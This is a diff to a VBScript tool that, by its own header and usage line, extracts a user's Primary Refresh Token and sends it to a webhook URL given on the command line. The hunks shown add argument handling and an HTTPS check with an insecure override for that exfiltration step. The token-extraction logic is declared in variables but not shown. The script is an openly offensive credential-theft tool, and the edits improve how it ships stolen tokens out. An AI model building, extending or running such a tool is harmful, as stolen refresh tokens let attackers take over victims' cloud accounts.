@@ -1,5 +1,5 @@
 ' VBScript implementation of PRT token extraction
-' Usage: cscript //Nologo Get-UserPRTToken.vbs <webhook_url>
+' Usage: cscript //Nologo Get-UserPRTToken.vbs <webhook_url> [--allow-http]
 
 Option Explicit
 
@@ -7,14 +7,35 @@ Dim webhookUrl, http, nonceResp, nonce, fso, shell, programFiles, windir
 Dim locations, browserCore, i, jsonRequest, jsonStr, tempPath
 Dim inputFile, outputFile, stream, textStream, length, fileStream
 Dim rawOutput, jsonStart, jsonResponse, parsed, prtToken, httpPost
+Dim allowHttp
 
 ' Check arguments
 If WScript.Arguments.Count = 0 Then
-    WScript.Echo "[!] Usage: cscript //Nologo Get-UserPRTToken.vbs <webhook_url>"
+    WScript.Echo "[!] Usage: cscript //Nologo Get-UserPRTToken.vbs <webhook_url> [--allow-http]"
     WScript.Quit 1
 End If
 
 webhookUrl = WScript.Arguments(0)
+
+' Check for --allow-http flag
+allowHttp = False
+If WScript.Arguments.Count > 1 Then
+    If LCase(WScript.Arguments(1)) = "--allow-http" Then
+        allowHttp = True
+    End If
+End If
+
+' Validate HTTPS for secure transmission of PRT token (unless --allow-http)
+If LCase(Left(webhookUrl, 8)) <> "https://" Then
+    If allowHttp Then
+        WScript.Echo "[!] WARNING: Using HTTP - token will be sent unencrypted!"
+    Else
+        WScript.Echo "[!] ERROR: Webhook URL must use HTTPS for secure token transmission"
+        WScript.Echo "[!] Provided URL: " & webhookUrl
+        WScript.Echo "[!] Use --allow-http flag to bypass (insecure, for local testing only)"
+        WScript.Quit 1
+    End If
+End If
 
 On Error Resume Next
 
